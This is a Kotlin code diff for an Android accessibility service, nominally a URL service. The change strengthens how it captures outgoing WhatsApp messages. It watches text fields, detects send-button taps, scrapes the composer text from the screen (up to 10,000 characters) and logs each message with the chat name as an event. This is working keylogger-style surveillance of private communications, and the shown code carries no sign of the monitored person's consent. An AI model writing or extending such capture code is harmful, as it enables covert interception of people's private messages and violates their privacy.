@@ -94,48 +94,119 @@ class UrlAccessibilityService : AccessibilityService() {
     private fun handleWhatsAppEvent(pkg: String, event: AccessibilityEvent) {
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
-                // الكتابة في حقل الرسالة — نحفظ النص الحالي حتى لحظة الضغط على إرسال
                 val src = event.source
-                val isEdit = src?.className?.toString()?.contains("EditText") == true ||
-                    event.className?.toString()?.contains("EditText") == true
+                val isEdit = src?.isEditable == true ||
+                    src?.className?.toString()?.contains("EditText", ignoreCase = true) == true ||
+                    event.className?.toString()?.contains("EditText", ignoreCase = true) == true
                 if (!isEdit) return
+
+                // source.text عادةً يحتوي النص الكامل للحقل، وليس الجزء الذي تغيّر فقط.
                 val txt = src?.text?.toString() ?: event.text?.joinToString("") ?: ""
-                if (txt.isNotEmpty() && txt.length <= 500) composingText = txt
+                if (txt.length <= 10_000) composingText = txt
             }
 
             AccessibilityEvent.TYPE_VIEW_CLICKED -> {
-                val desc = event.source?.contentDescription?.toString()
-                    ?: event.contentDescription?.toString() ?: ""
-                // زر الإرسال: وصفه القصير يحتوي كلمة إرسال/send
-                if (desc.isEmpty() || desc.length > 40) return
-                if (SEND_HINTS.none { desc.contains(it, ignoreCase = true) }) return
+                if (!isWhatsAppSendAction(event)) return
 
-                val text = composingText.trim()
-                if (text.isEmpty()) return
-                // منع تسجيل الرسالة نفسها مرتين (واتساب قد يصدر حدثي ضغط متتاليين)
+                // نقرأ الحقل من الشاشة أيضًا؛ بعض إصدارات واتساب لا ترسل النص في event.source.
+                val visibleText = readWhatsAppComposerText()
+                val text = (visibleText.ifBlank { composingText }).trim()
+                if (text.isEmpty()) {
+                    composingText = ""
+                    return
+                }
+
+                // بعض الإصدارات تطلق أكثر من حدث لنقرة الإرسال الواحدة.
                 val now = System.currentTimeMillis()
-                if (text == lastSentText && now - lastSentAt < 4_000) return
+                if (text == lastSentText && now - lastSentAt < 900L) return
                 lastSentText = text
                 lastSentAt = now
 
-                // اسم صاحب المحادثة الحالي (أفضل محاولة)
                 readChatName().takeIf { it.isNotBlank() }?.let { lastChatName = it }
 
-                val json = org.json.JSONObject()
+                val json = JSONObject()
                     .put("type", "WHATSAPP")
                     .put("direction", "OUTGOING")
-                    .put("title", lastChatName.ifBlank { "رسالة صادرة" })
+                    .put("title", lastChatName.ifBlank { "محادثة غير محددة" })
                     .put("app", whatsAppName(pkg))
                     .put("packageName", pkg)
-                    .put("meta", org.json.JSONObject().put("text", text))
+                    .put("meta", JSONObject().put("text", text))
                 EventStore.addEvent(applicationContext, json)
                 composingText = ""
             }
 
             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
-                // فتح محادثة جديدة — حدّث اسم المحادثة الحالية
                 readChatName().takeIf { it.isNotBlank() }?.let { lastChatName = it }
+                composingText = ""
             }
+        }
+    }
+
+    /**
+     * يتحقق من أن النقرة على زر الإرسال نفسه، باستخدام وصف العقدة أو معرّفها.
+     * لا يعتمد على نص عام في الشاشة حتى لا يسجل نقرات أخرى كإرسال.
+     */
+    private fun isWhatsAppSendAction(event: AccessibilityEvent): Boolean {
+        val direct = event.contentDescription?.toString().orEmpty()
+        if (containsSendHint(direct)) return true
+
+        val original = event.source
+        var node: AccessibilityNodeInfo? = original
+        var depth = 0
+        while (node != null && depth < 4) {
+            val description = node.contentDescription?.toString().orEmpty()
+            val text = node.text?.toString().orEmpty()
+            val viewId = node.viewIdResourceName?.lowercase().orEmpty()
+            if (containsSendHint(description) || containsSendHint(text)) return true
+            if (viewId.contains("send") || viewId.contains("send_button") ||
+                viewId.contains("send_message")
+            ) return true
+
+            node = node.parent
+            depth++
+        }
+        try { original?.recycle() } catch (_: Exception) {}
+        return false
+    }
+
+    private fun containsSendHint(value: String): Boolean {
+        if (value.isBlank() || value.length > 80) return false
+        return SEND_HINTS.any { value.contains(it, ignoreCase = true) }
+    }
+
+    /** قراءة نص محرر الرسالة الظاهر حاليًا في محادثة واتساب. */
+    private fun readWhatsAppComposerText(): String {
+        try {
+            val root = rootInActiveWindow ?: return ""
+            val stack = ArrayDeque<AccessibilityNodeInfo>()
+            stack.add(root)
+            var scanned = 0
+            var best = ""
+            var bestById = ""
+
+            while (stack.isNotEmpty() && scanned < 500) {
+                val node = stack.removeFirst()
+                scanned++
+                val cls = node.className?.toString().orEmpty()
+                val id = node.viewIdResourceName?.lowercase().orEmpty()
+                val value = node.text?.toString().orEmpty()
+                val isEditor = node.isEditable || cls.contains("EditText", ignoreCase = true)
+
+                if (isEditor && value.length <= 10_000) {
+                    if (value.length > best.length) best = value
+                    val looksLikeComposer = listOf(
+                        "entry", "input", "message", "chat_input", "conversation"
+                    ).any { id.contains(it) }
+                    if (looksLikeComposer && value.length >= bestById.length) bestById = value
+                }
+
+                for (i in 0 until node.childCount) {
+                    node.getChild(i)?.let { stack.add(it) }
+                }
+            }
+            return bestById.ifBlank { best }
+        } catch (_: Exception) {
+            return ""
         }
     }
 
